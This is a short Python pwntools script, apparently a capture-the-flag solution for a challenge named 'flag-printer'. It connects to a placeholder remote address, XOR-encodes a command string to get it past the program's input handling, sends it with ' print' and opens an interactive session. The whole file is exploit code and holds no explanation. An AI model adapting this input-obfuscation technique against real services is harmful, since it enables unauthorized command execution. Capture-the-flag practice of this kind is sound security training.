from pwn import *

#p = process("./flag-printer")
p = remote("ADDRESS", PORT)

command = "&-17"
payload = b""

for i in range(len(command)):
    payload += chr(ord(command[i]) ^ 0x42).encode('utf-8')

payload += b" print"
p.sendlineafter("> ", payload)
p.interactive()